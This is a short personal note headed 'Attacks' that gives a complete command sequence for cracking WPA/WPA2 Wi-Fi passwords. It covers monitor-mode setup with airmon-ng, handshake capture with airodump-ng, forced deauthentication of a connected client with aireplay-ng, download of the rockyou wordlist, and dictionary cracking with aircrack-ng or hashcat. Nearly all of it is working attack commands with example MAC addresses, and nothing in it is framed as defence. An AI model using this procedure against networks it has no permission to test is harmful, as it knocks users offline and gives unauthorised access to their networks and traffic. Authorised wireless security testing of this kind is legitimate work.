[[Attacks]]

https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2

##### Kill unnecessary processes:
`sudo airmon-ng check kill`

##### Start listen for all nearby beacon frames to get target BSSID and channel:
`sudo airmon-ng start wlan0`
##### Same but with device manufacturer:
`sudo airodump-ng wlan0 -M --wps`

##### Start listening for handshake:
`-w capture/` - capture packets to a file
`-c` - set channel
`airodump-ng -c 1 --bssid <BSSID> -w capture/ wlan0`

##### Optionally deauth a connected client to force a handshake:
`-0 2` specifies we would like to send 2 deauth packets. Increase this number
if need be with the risk of noticeably interrupting client network activity  
`-a` is the MAC of the access point  
`-c` is the MAC of the client  
`aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0`

##### Crack password with aircrack-ng
In order to crack the password, we can either use aircrack itself or create a hashcat file in order to use **GPU** acceleration.
`curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt`
crack w/ aircrack-ng:
`aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt capture/-01.cap`

##### or crack password with hashcat (windows)
convert cap to hccapx:
`cap2hccapx.bin capture/-01.cap capture/-01.hccapx`
or online: https://hashcat.net/cap2hashcat/

crack with hashcat (wpa2 mode):
`.\hashcat.exe -m 22000 -a 0 .\166300_1690285999.hc22000 .\rockyou.txt`

##### Restore network connection
`sudo ifconfig wlan0 down`
`sudo iwconfig wlan0 mode managed`
`sudo ifconfig wlan0 up`
`sudo service NetworkManager restart`